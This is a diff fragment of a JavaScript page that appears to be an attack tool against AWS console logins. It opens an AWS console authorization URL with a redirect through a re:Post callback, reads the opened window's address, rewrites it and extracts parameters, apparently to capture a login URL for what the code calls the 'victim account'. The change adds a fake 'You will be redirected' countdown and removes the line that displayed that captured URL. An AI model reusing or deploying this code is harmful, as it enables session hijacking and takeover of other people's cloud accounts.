@@ -564,14 +564,24 @@ document.getElementById('openWindowBtn').addEventListener('click', function() {
 
     
     //let newWindow = window.open("https://eu-central-1.console.aws.amazon.com/cke/auth?region=eu-central-1&redirectUrl=https%3A%2Frepost.aws%2Fapi%2Fv1%2Fidentity%2Faws%2Fcallback%3Fstate%3DeyJub25jZSI6ImdkYmQ5aUxqUUdPM0RseUVEdmRDMUEifQ&challenge=V9Yz1LWbNnjk2PJZaxgoN8PN3tXhppD0Vk2hOg5huhU", "_blank");
+    let n = 10; // Set initial countdown value
+    const paragraph = document.getElementById("vic-url");
+    const countdown = setInterval(function() {
+        paragraph.innerHTML = `<strong>You will be redirected after ${n} second${n === 1 ? '' : 's'}<strong><br/>`;
+        n--;
+
+        if (n < 0) {
+            clearInterval(countdown); // Stop the countdown when n reaches 0
+            // Add any redirect or action here
+        }
+    }, 1300); // Update every 1 second (1000 milliseconds)
 
     if (newWindow) {
         setTimeout(function () {
             try {
                 let url = newWindow.location.href;
                 let modifiedUrl = url.replace(/https:\/\/.*\.console\.aws\.amazon\.com\//, 'https://');
-                var paragraph = document.getElementById("vic-url");
-                paragraph.innerHTML = "<strong>Login URL to the victim account:<strong><br/> " + modifiedUrl;
+
                 //alert("Login URL to the victim account: " + modifiedUrl);
                 // 1. Extract the parameter value from the URL
                 function getParameterByName(name) {
